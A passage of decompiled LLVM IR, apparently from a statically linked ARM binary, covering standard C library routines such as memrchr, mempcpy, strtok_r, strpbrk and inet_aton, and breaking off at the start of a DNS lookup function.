  %v4_100f8 = mul i32 %v5_100f0, 65536
  %v5_100f8 = or i32 %v4_100f8, %v5_100f0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1017c37, 3
  br i1 %tmp, label %dec_label_pc_10100, label %dec_label_pc_101a4.preheader

dec_label_pc_10100:                               ; preds = %dec_label_pc_100f0, %dec_label_pc_1017c.backedge
  %v0_1011c82 = phi i32 [ %v1_1011c, %dec_label_pc_1017c.backedge ], [ %v0_1017c37, %dec_label_pc_100f0 ]
  %v0_1010081 = phi i32 [ %v4_10100, %dec_label_pc_1017c.backedge ], [ %v1_100f4, %dec_label_pc_100f0 ]
  %v1_10100 = inttoptr i32 %v0_1010081 to i32*
  %v2_10100 = load i32, i32* %v1_10100, align 4
  %v4_10100 = add i32 %v0_1010081, 4
  store i32 %v4_10100, i32* @ip, align 4
  %v2_10104 = xor i32 %v2_10100, %v5_100f8
  %v2_10108 = add i32 %v2_10104, 2130640639
  %v1_1010c = sub i32 -1, %v2_10104
  %v2_10110 = xor i32 %v2_10108, %v1_1010c
  %v2_10114 = and i32 %v2_10110, -2130640640
  %v2_10118 = icmp eq i32 %v2_10114, 0
  %v1_1011c = add i32 %v0_1011c82, -4
  br i1 %v2_10118, label %dec_label_pc_1017c.backedge, label %dec_label_pc_10124

dec_label_pc_1017c.backedge:                      ; preds = %dec_label_pc_10100, %dec_label_pc_10168
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1011c, 3
  br i1 %tmp107, label %dec_label_pc_10100, label %dec_label_pc_101a4.preheader

dec_label_pc_10124:                               ; preds = %dec_label_pc_10100
  %v2_10124 = inttoptr i32 %v0_1010081 to i8*
  %v3_10124 = load i8, i8* %v2_10124, align 1
  %v4_10124 = zext i8 %v3_10124 to i32
  %v9_1012c = icmp eq i32 %v4_10124, %v1_100c4
  %v1_10130 = add i32 %v0_1010081, 3
  %v1_10134 = add i32 %v0_1010081, 1
  store i32 %v1_10134, i32* @lr, align 4
  %v1_10138 = add i32 %v0_1010081, 2
  br i1 %v9_1012c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_10124
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 %v0_1010081

bb51:                                             ; preds = %dec_label_pc_10124
  %v2_10140 = inttoptr i32 %v1_10134 to i8*
  %v3_10140 = load i8, i8* %v2_10140, align 1
  %v4_10140 = zext i8 %v3_10140 to i32
  %v9_10144 = icmp eq i32 %v4_10140, %v1_100c4
  br i1 %v9_10144, label %dec_label_pc_1014c, label %dec_label_pc_10154

dec_label_pc_1014c:                               ; preds = %bb51
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 %v1_10134

dec_label_pc_10154:                               ; preds = %bb51
  %v2_10154 = inttoptr i32 %v1_10138 to i8*
  %v3_10154 = load i8, i8* %v2_10154, align 1
  %v4_10154 = zext i8 %v3_10154 to i32
  %v9_10158 = icmp eq i32 %v4_10154, %v1_100c4
  br i1 %v9_10158, label %dec_label_pc_10160, label %dec_label_pc_10168

dec_label_pc_10160:                               ; preds = %dec_label_pc_10154
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 %v1_10138

dec_label_pc_10168:                               ; preds = %dec_label_pc_10154
  %v2_10168 = inttoptr i32 %v1_10130 to i8*
  %v3_10168 = load i8, i8* %v2_10168, align 1
  %v4_10168 = zext i8 %v3_10168 to i32
  %v9_1016c = icmp eq i32 %v4_10168, %v1_100c4
  br i1 %v9_1016c, label %dec_label_pc_10174, label %dec_label_pc_1017c.backedge

dec_label_pc_10174:                               ; preds = %dec_label_pc_10168
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 %v1_10130

dec_label_pc_101a4.preheader:                     ; preds = %dec_label_pc_1017c.backedge, %dec_label_pc_100f0
  %v0_10100.lcssa = phi i32 [ %v1_100f4, %dec_label_pc_100f0 ], [ %v4_10100, %dec_label_pc_1017c.backedge ]
  %v0_1011c.lcssa = phi i32 [ %v0_1017c37, %dec_label_pc_100f0 ], [ %v1_1011c, %dec_label_pc_1017c.backedge ]
  %v2_101a411 = icmp eq i32 %v0_1011c.lcssa, 0
  br i1 %v2_101a411, label %dec_label_pc_101ac, label %dec_label_pc_10194

dec_label_pc_10194:                               ; preds = %dec_label_pc_101a4, %dec_label_pc_101a4.preheader
  %v0_101a4.in = phi i32 [ %v0_101a4, %dec_label_pc_101a4 ], [ %v0_1011c.lcssa, %dec_label_pc_101a4.preheader ]
  %v15_1019c = phi i32 [ %v1_101a0, %dec_label_pc_101a4 ], [ %v0_10100.lcssa, %dec_label_pc_101a4.preheader ]
  %v0_101a4 = add i32 %v0_101a4.in, -1
  %v1_10194 = inttoptr i32 %v15_1019c to i8*
  %v2_10194 = load i8, i8* %v1_10194, align 1
  %v3_10194 = zext i8 %v2_10194 to i32
  %v9_10198 = icmp eq i32 %v3_10194, %v1_100c4
  br i1 %v9_10198, label %bb52, label %dec_label_pc_101a4

bb52:                                             ; preds = %dec_label_pc_10194
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 %v15_1019c

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10194
  %v1_101a0 = add i32 %v15_1019c, 1
  %v2_101a4 = icmp eq i32 %v0_101a4, 0
  br i1 %v2_101a4, label %dec_label_pc_101ac, label %dec_label_pc_10194

dec_label_pc_101ac:                               ; preds = %dec_label_pc_101a4, %dec_label_pc_101a4.preheader
  store i32 %v3_100c0, i32* @r4, align 4
  store i32 %v6_100c0, i32* @r5, align 4
  store i32 %v9_100c0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1019c, { 1, 0, 2 }
  uselistorder i32 %v1_1011c, { 1, 0, 2 }
  uselistorder i32 %v4_10100, { 0, 2, 1 }
  uselistorder i32 %v0_1010081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_100f0, { 1, 0 }
  uselistorder i32 %v0_1017c37, { 1, 2, 0 }
  uselistorder i32 %v1_100c4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_100c0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1017c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10100, { 1, 0 }
  uselistorder label %dec_label_pc_100f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100e8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_101c8 = call i32 @memcpy()
  %v0_101cc = load i32, i32* @r5, align 4
  %v1_101cc = load i32, i32* @r4, align 4
  %v2_101cc = add i32 %v1_101cc, %v0_101cc
  ret i32 %v2_101cc
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_101d4 = load i32, i32* @r4, align 4
  %v1_101d8 = urem i32 %arg2, 256
  %v2_101dc = add i32 %arg3, %arg1
  %v2_101f42 = icmp eq i32 %arg3, 0
  br i1 %v2_101f42, label %dec_label_pc_10204, label %dec_label_pc_101fc

dec_label_pc_101e4:                               ; preds = %dec_label_pc_101fc
  %v1_101e4 = add i32 %v0_101e4, -1
  %v2_101e4 = inttoptr i32 %v1_101e4 to i8*
  %v3_101e4 = load i8, i8* %v2_101e4, align 1
  %v4_101e4 = zext i8 %v3_101e4 to i32
  %v9_101e8 = icmp eq i32 %v4_101e4, %v1_101d8
  br i1 %v9_101e8, label %bb, label %dec_label_pc_101f4

bb:                                               ; preds = %dec_label_pc_101e4
  ret i32 %v1_101e4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101e4
  %v1_101f0 = add i32 %v0_101f0, -1
  %v2_101f4 = icmp eq i32 %v1_101f0, 0
  br i1 %v2_101f4, label %dec_label_pc_10204, label %dec_label_pc_101fc

dec_label_pc_101fc:                               ; preds = %entry, %dec_label_pc_101f4
  %v0_101f0 = phi i32 [ %v1_101f0, %dec_label_pc_101f4 ], [ %arg3, %entry ]
  %v0_101e4 = phi i32 [ %v1_101e4, %dec_label_pc_101f4 ], [ %v2_101dc, %entry ]
  %v1_101fc = urem i32 %v0_101e4, 4
  %v2_101fc = icmp eq i32 %v1_101fc, 0
  br i1 %v2_101fc, label %dec_label_pc_10204, label %dec_label_pc_101e4

dec_label_pc_10204:                               ; preds = %dec_label_pc_101f4, %dec_label_pc_101fc, %entry
  %v0_1029c11 = phi i32 [ %v2_101dc, %entry ], [ %v1_101e4, %dec_label_pc_101f4 ], [ %v0_101e4, %dec_label_pc_101fc ]
  %v0_102887 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_101f4 ], [ %v0_101f0, %dec_label_pc_101fc ]
  %v4_10204 = mul nuw nsw i32 %v1_101d8, 256
  %v5_10204 = or i32 %v4_10204, %v1_101d8
  %v4_10208 = mul i32 %v5_10204, 65536
  %v5_10208 = or i32 %v4_10208, %v5_10204
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_102887, 3
  br i1 %tmp, label %dec_label_pc_10210, label %dec_label_pc_10298

dec_label_pc_10210:                               ; preds = %dec_label_pc_10204, %.backedge.backedge
  %v0_1022c51 = phi i32 [ %v1_1022c, %.backedge.backedge ], [ %v0_102887, %dec_label_pc_10204 ]
  %v0_1021050 = phi i32 [ %v1_10210, %.backedge.backedge ], [ %v0_1029c11, %dec_label_pc_10204 ]
  %v1_10210 = add i32 %v0_1021050, -4
  %v2_10210 = inttoptr i32 %v1_10210 to i32*
  %v3_10210 = load i32, i32* %v2_10210, align 4
  %v2_10214 = xor i32 %v3_10210, %v5_10208
  %v2_10218 = add i32 %v2_10214, 2130640639
  %v1_1021c = sub i32 -1, %v2_10214
  %v2_10220 = xor i32 %v2_10218, %v1_1021c
  %v2_10224 = and i32 %v2_10220, -2130640640
  %v2_10228 = icmp eq i32 %v2_10224, 0
  %v1_1022c = add i32 %v0_1022c51, -4
  br i1 %v2_10228, label %.backedge.backedge, label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_10210
  %v1_10234 = add i32 %v0_1021050, -1
  %v2_10234 = inttoptr i32 %v1_10234 to i8*
  %v3_10234 = load i8, i8* %v2_10234, align 1
  %v4_10234 = zext i8 %v3_10234 to i32
  %v9_10238 = icmp eq i32 %v4_10234, %v1_101d8
  %v1_1023c = add i32 %v0_1021050, -2
  store i32 %v1_1023c, i32* @ip, align 4
  %v1_10244 = add i32 %v0_1021050, -3
  store i32 %v1_10244, i32* @lr, align 4
  br i1 %v9_10238, label %dec_label_pc_1024c, label %dec_label_pc_10254

dec_label_pc_1024c:                               ; preds = %dec_label_pc_10234
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 %v1_10234

dec_label_pc_10254:                               ; preds = %dec_label_pc_10234
  %v2_10254 = inttoptr i32 %v1_1023c to i8*
  %v3_10254 = load i8, i8* %v2_10254, align 1
  %v4_10254 = zext i8 %v3_10254 to i32
  %v9_10258 = icmp eq i32 %v4_10254, %v1_101d8
  br i1 %v9_10258, label %dec_label_pc_10260, label %dec_label_pc_10268

dec_label_pc_10260:                               ; preds = %dec_label_pc_10254
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 %v1_1023c

dec_label_pc_10268:                               ; preds = %dec_label_pc_10254
  %v2_10268 = inttoptr i32 %v1_10244 to i8*
  %v3_10268 = load i8, i8* %v2_10268, align 1
  %v4_10268 = zext i8 %v3_10268 to i32
  %v9_1026c = icmp eq i32 %v4_10268, %v1_101d8
  br i1 %v9_1026c, label %dec_label_pc_10274, label %dec_label_pc_1027c

dec_label_pc_10274:                               ; preds = %dec_label_pc_10268
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 %v1_10244

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10268
  %v1_1027c = inttoptr i32 %v1_10210 to i8*
  %v2_1027c = load i8, i8* %v1_1027c, align 1
  %v3_1027c = zext i8 %v2_1027c to i32
  %v9_10280 = icmp eq i32 %v3_1027c, %v1_101d8
  br i1 %v9_10280, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1027c, %dec_label_pc_10210
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1022c, 3
  br i1 %tmp70, label %dec_label_pc_10210, label %dec_label_pc_10298

bb19:                                             ; preds = %dec_label_pc_1027c
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 %v1_10210

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10298
  %v1_102a8 = add i32 %v0_102a8, -1
  %v1_1029c = add i32 %v0_1029c, -1
  %v2_1029c = inttoptr i32 %v1_1029c to i8*
  %v3_1029c = load i8, i8* %v2_1029c, align 1
  %v4_1029c = zext i8 %v3_1029c to i32
  %v9_102a0 = icmp eq i32 %v4_1029c, %v1_101d8
  br i1 %v9_102a0, label %bb20, label %dec_label_pc_10298

bb20:                                             ; preds = %dec_label_pc_1029c
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 %v1_1029c

dec_label_pc_10298:                               ; preds = %dec_label_pc_10204, %.backedge.backedge, %dec_label_pc_1029c
  %v0_1029c = phi i32 [ %v1_1029c, %dec_label_pc_1029c ], [ %v0_1029c11, %dec_label_pc_10204 ], [ %v1_10210, %.backedge.backedge ]
  %v0_102a8 = phi i32 [ %v1_102a8, %dec_label_pc_1029c ], [ %v0_102887, %dec_label_pc_10204 ], [ %v1_1022c, %.backedge.backedge ]
  %v2_102a8 = icmp eq i32 %v0_102a8, 0
  br i1 %v2_102a8, label %dec_label_pc_102b0, label %dec_label_pc_1029c

dec_label_pc_102b0:                               ; preds = %dec_label_pc_10298
  store i32 %v3_101d4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_102a8, { 1, 0 }
  uselistorder i32 %v1_1022c, { 1, 0, 2 }
  uselistorder i32 %v1_10210, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1021050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_10204, { 1, 0 }
  uselistorder i32 %v0_102887, { 1, 2, 0 }
  uselistorder i32 %v0_101e4, { 1, 0, 2 }
  uselistorder i32 %v1_101e4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_101dc, { 1, 0 }
  uselistorder i32 %v1_101d8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_101d4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10298, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10210, { 1, 0 }
  uselistorder label %dec_label_pc_10204, { 1, 0, 2 }
  uselistorder label %dec_label_pc_101fc, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_102c0 = load i32, i32* @r4, align 4
  store i32 %v3_102c0, i32* %stack_var_-16, align 4
  %v6_102c0 = load i32, i32* @r5, align 4
  %v0_102c4 = load i32, i32* @r0, align 4
  store i32 %v0_102c4, i32* %r4.global-to-local, align 4
  %v2_102c4 = icmp eq i32 %v0_102c4, 0
  %v1_102c8 = load i32, i32* @r2, align 4
  br i1 %v2_102c4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_102c8 = inttoptr i32 %v1_102c8 to i32*
  %v3_102c8 = load i32, i32* %v2_102c8, align 4
  store i32 %v3_102c8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_102cc = phi i32 [ %v3_102c8, %bb ], [ %v0_102c4, %entry ]
  store i32 %v0_102cc, i32* @r0, align 4
  store i32 %v1_102c8, i32* @r5, align 4
  %v0_102d4 = load i32, i32* @r1, align 4
  store i32 %v0_102d4, i32* %r6.global-to-local, align 4
  %v1_102d8 = inttoptr i32 %v0_102cc to i8*
  %v2_102d8 = call i32 @__GI_strspn(i8* %v1_102d8)
  %v0_102dc = load i32, i32* %r4.global-to-local, align 4
  %v2_102dc = add i32 %v0_102dc, %v2_102d8
  %v3_102dc = inttoptr i32 %v2_102dc to i8*
  %v4_102dc = load i8, i8* %v3_102dc, align 1
  %v6_102dc = zext i8 %v4_102dc to i32
  store i32 %v6_102dc, i32* %r3.global-to-local, align 4
  store i32 %v2_102dc, i32* @r4, align 4
  %v2_102e4 = icmp eq i8 %v4_102dc, 0
  store i1 %v2_102e4, i1* @cpsr_z, align 1
  %v0_102e8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_102e8, i32* @r1, align 4
  store i32 %v2_102dc, i32* @r0, align 4
  br i1 %v2_102e4, label %bb7, label %dec_label_pc_102f8

bb7:                                              ; preds = %entry._crit_edge
  %v2_102f0 = load i32, i32* @r5, align 4
  %v3_102f0 = inttoptr i32 %v2_102f0 to i32*
  store i32 %v2_102dc, i32* %v3_102f0, align 4
  br label %dec_label_pc_1032c

dec_label_pc_102f8:                               ; preds = %entry._crit_edge
  %v0_102f8 = call i32 @__GI_strpbrk()
  store i32 %v0_102f8, i32* %r2.global-to-local, align 4
  %v3_102fc = icmp eq i32 %v0_102f8, 0
  store i1 %v3_102fc, i1* @cpsr_z, align 1
  br i1 %v3_102fc, label %dec_label_pc_1030c, label %dec_label_pc_1031c

dec_label_pc_1030c:                               ; preds = %dec_label_pc_102f8
  %v0_10304 = load i32, i32* @r4, align 4
  %v2_1030c = call i32 @rawmemchr(i32 %v0_10304, i32 0)
  %v0_10310 = load i32, i32* @r4, align 4
  store i32 %v0_10310, i32* %r3.global-to-local, align 4
  %v1_10314 = load i32, i32* @r5, align 4
  %v2_10314 = inttoptr i32 %v1_10314 to i32*
  store i32 %v2_1030c, i32* %v2_10314, align 4
  br label %dec_label_pc_1032c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_102f8
  %v3_10320 = inttoptr i32 %v0_102f8 to i8*
  store i8 0, i8* %v3_10320, align 1
  %v4_10320 = load i32, i32* %r2.global-to-local, align 4
  %v5_10320 = add i32 %v4_10320, 1
  store i32 %v5_10320, i32* @r2, align 4
  %v1_10324 = load i32, i32* @r5, align 4
  %v2_10324 = inttoptr i32 %v1_10324 to i32*
  store i32 %v5_10320, i32* %v2_10324, align 4
  %v0_10328 = load i32, i32* @r4, align 4
  store i32 %v0_10328, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1032c

dec_label_pc_1032c:                               ; preds = %bb7, %dec_label_pc_1030c, %dec_label_pc_1031c
  %v0_1032c = load i32, i32* %r3.global-to-local, align 4
  %v2_10330 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10330, i32* @r4, align 4
  store i32 %v6_102c0, i32* @r5, align 4
  ret i32 %v0_1032c

; uselistorder directives
  uselistorder i32 %v0_102cc, { 1, 0 }
  uselistorder i32 %v0_102c4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1032c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_10334 = load i32, i32* @r0, align 4
  %v1_103582 = inttoptr i32 %v0_10334 to i8*
  %v2_103583 = load i8, i8* %v1_103582, align 1
  %v3_103584 = zext i8 %v2_103583 to i32
  %v2_1035c5 = icmp eq i8 %v2_103583, 0
  br i1 %v2_1035c5, label %dec_label_pc_10358._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_10364.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1033c:                               ; preds = %dec_label_pc_10344
  %v1_1034c = add i32 %v0_1034c, 1
  %v9_1033c = icmp eq i32 %v3_10344, %v3_103586
  br i1 %v9_1033c, label %dec_label_pc_1036c, label %dec_label_pc_10344

dec_label_pc_10344:                               ; preds = %dec_label_pc_1033c, %bb
  %v0_1034c = phi i32 [ %v1_1034c, %dec_label_pc_1033c ], [ %v0_10364.pre, %bb ]
  %v1_10344 = inttoptr i32 %v0_1034c to i8*
  %v2_10344 = load i8, i8* %v1_10344, align 1
  %v3_10344 = zext i8 %v2_10344 to i32
  store i32 %v3_10344, i32* @ip, align 4
  %v2_10348 = icmp eq i8 %v2_10344, 0
  br i1 %v2_10348, label %dec_label_pc_10354, label %dec_label_pc_1033c

dec_label_pc_10354:                               ; preds = %dec_label_pc_10344
  %v1_10354 = add i32 %v0_10354, 1
  %v1_10358 = inttoptr i32 %v1_10354 to i8*
  %v2_10358 = load i8, i8* %v1_10358, align 1
  %v3_10358 = zext i8 %v2_10358 to i32
  %v2_1035c = icmp eq i8 %v2_10358, 0
  br i1 %v2_1035c, label %dec_label_pc_10358._crit_edge, label %bb

dec_label_pc_10358._crit_edge:                    ; preds = %dec_label_pc_10354, %entry
  %v3_10358.lcssa = phi i32 [ %v3_103584, %entry ], [ %v3_10358, %dec_label_pc_10354 ]
  ret i32 %v3_10358.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_10354
  %v0_10354 = phi i32 [ %v0_10334, %.lr.ph ], [ %v1_10354, %dec_label_pc_10354 ]
  %v3_103586 = phi i32 [ %v3_103584, %.lr.ph ], [ %v3_10358, %dec_label_pc_10354 ]
  br label %dec_label_pc_10344

dec_label_pc_1036c:                               ; preds = %dec_label_pc_1033c
  ret i32 %v0_10354

; uselistorder directives
  uselistorder i32 %v3_10358, { 1, 0 }
  uselistorder i32 %v3_10344, { 1, 0 }
  uselistorder i32 %v0_1034c, { 1, 0 }
  uselistorder i32 %v3_103584, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_10344, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10374 = load i32, i32* %r0.global-to-local, align 4
  %v2_10374 = icmp eq i32 %v0_10374, 0
  %v3_10378 = load i32, i32* @r4, align 4
  store i32 %v3_10378, i32* %stack_var_-20, align 4
  br i1 %v2_10374, label %dec_label_pc_10454, label %dec_label_pc_10390.lr.ph

dec_label_pc_10390:                               ; preds = %dec_label_pc_10390.lr.ph, %dec_label_pc_10414
  %v1_10414 = phi i32 [ 0, %dec_label_pc_10390.lr.ph ], [ %v5_10414, %dec_label_pc_10414 ]
  %v0_10418 = phi i32 [ 1, %dec_label_pc_10390.lr.ph ], [ %v1_10418, %dec_label_pc_10414 ]
  %v0_10398 = phi i32 [ %v0_10374, %dec_label_pc_10390.lr.ph ], [ %v0_1039825, %dec_label_pc_10414 ]
  store i32 %v2_10394.pre, i32* @lr, align 4
  %v1_10398 = inttoptr i32 %v0_10398 to i8*
  %v2_10398 = load i8, i8* %v1_10398, align 1
  %v3_10398 = zext i8 %v2_10398 to i32
  %v3_1039c = mul nuw nsw i32 %v3_10398, 2
  %v4_1039c = add i32 %v3_1039c, %v2_10394.pre
  %v5_1039c = inttoptr i32 %v4_1039c to i8*
  %v6_1039c = load i8, i8* %v5_1039c, align 1
  %v1_103a0 = and i8 %v6_1039c, 8
  %v2_103a0 = icmp eq i8 %v1_103a0, 0
  br i1 %v2_103a0, label %dec_label_pc_10454, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10390
  br label %dec_label_pc_103c8

dec_label_pc_103b0:                               ; preds = %dec_label_pc_103c8
  %v3_103b4 = mul i32 %v0_10414, 10
  %v4_103b4 = add i32 %v3_103c8, %v3_103b4
  %v1_103b8 = add i32 %v4_103b4, -48
  %v8_103c0 = icmp sgt i32 %v1_103b8, 255
  br i1 %v8_103c0, label %dec_label_pc_10454, label %dec_label_pc_103c4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103b0
  %v1_103c4 = add i32 %v0_10404, 1
  store i32 %v1_103c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103a8, %dec_label_pc_103c4
  %v0_10414 = phi i32 [ 0, %dec_label_pc_103a8 ], [ %v1_103b8, %dec_label_pc_103c4 ]
  %v0_10404 = phi i32 [ %v0_10398, %dec_label_pc_103a8 ], [ %v1_103c4, %dec_label_pc_103c4 ]
  %v1_103c8 = inttoptr i32 %v0_10404 to i8*
  %v2_103c8 = load i8, i8* %v1_103c8, align 1
  %v3_103c8 = zext i8 %v2_103c8 to i32
  %v2_103cc = mul nuw nsw i32 %v3_103c8, 2
  %v2_103d0 = add i32 %v2_103cc, %v2_10394.pre
  %v3_103d4 = inttoptr i32 %v2_103d0 to i8*
  %v4_103d4 = load i8, i8* %v3_103d4, align 1
  %v6_103d4 = zext i8 %v4_103d4 to i32
  %v1_103e0 = and i32 %v6_103d4, 8
  %v2_103e0 = icmp eq i32 %v1_103e0, 0
  br i1 %v2_103e0, label %dec_label_pc_103e8, label %dec_label_pc_103b0

dec_label_pc_103e8:                               ; preds = %dec_label_pc_103c8
  %v8_103ec = icmp sgt i32 %v0_10418, 3
  br i1 %v8_103ec, label %dec_label_pc_10400, label %dec_label_pc_103f0

dec_label_pc_103f0:                               ; preds = %dec_label_pc_103e8
  %v7_103f0 = icmp eq i8 %v2_103c8, 46
  br i1 %v7_103f0, label %dec_label_pc_103f8, label %dec_label_pc_10454

dec_label_pc_103f8:                               ; preds = %dec_label_pc_103f0
  %v1_103f8 = add i32 %v0_10404, 1
  store i32 %v1_103f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10414

dec_label_pc_10400:                               ; preds = %dec_label_pc_103e8
  %v2_10400 = icmp eq i8 %v2_103c8, 0
  %v1_10404 = add i32 %v0_10404, 1
  store i32 %v1_10404, i32* %r0.global-to-local, align 4
  br i1 %v2_10400, label %dec_label_pc_10414, label %dec_label_pc_1040c

dec_label_pc_1040c:                               ; preds = %dec_label_pc_10400
  %v1_1040c = and i32 %v6_103d4, 32
  %v2_1040c = icmp eq i32 %v1_1040c, 0
  br i1 %v2_1040c, label %dec_label_pc_10454, label %dec_label_pc_10414

dec_label_pc_10414:                               ; preds = %dec_label_pc_1040c, %dec_label_pc_10400, %dec_label_pc_103f8
  %v0_1039825 = phi i32 [ %v1_10404, %dec_label_pc_1040c ], [ %v1_10404, %dec_label_pc_10400 ], [ %v1_103f8, %dec_label_pc_103f8 ]
  %v4_10414 = mul i32 %v1_10414, 256
  %v5_10414 = or i32 %v0_10414, %v4_10414
  %v1_10418 = add nuw nsw i32 %v0_10418, 1
  %v7_10420 = icmp slt i32 %v1_10418, 5
  br i1 %v7_10420, label %dec_label_pc_10390, label %dec_label_pc_10424

dec_label_pc_10390.lr.ph:                         ; preds = %entry
  %v2_10394.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %dec_label_pc_10390

dec_label_pc_10424:                               ; preds = %dec_label_pc_10414
  %v2_10424 = icmp eq i32 %arg2, 0
  br i1 %v2_10424, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_10424
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_10424
  %v3_10440 = call i32 @llvm.bswap.i32(i32 %v5_10414)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1044c = inttoptr i32 %arg2 to i32*
  store i32 %v3_10440, i32* %v3_1044c, align 4
  %v2_10450.pre = load i32, i32* %stack_var_-20, align 4
  %v17_10450.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_10450 = phi i32 [ 1, %bb ], [ %v17_10450.pre, %bb41 ]
  %v2_10450 = phi i32 [ %v3_10378, %bb ], [ %v2_10450.pre, %bb41 ]
  store i32 %v2_10450, i32* @r4, align 4
  ret i32 %v17_10450

dec_label_pc_10454:                               ; preds = %dec_label_pc_103f0, %dec_label_pc_1040c, %dec_label_pc_10390, %dec_label_pc_103b0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_10378, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10394.pre, { 2, 1, 0 }
  uselistorder i32 %v1_10418, { 1, 0 }
  uselistorder i32 %v0_10404, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10378, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 8, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10454, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_103c8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
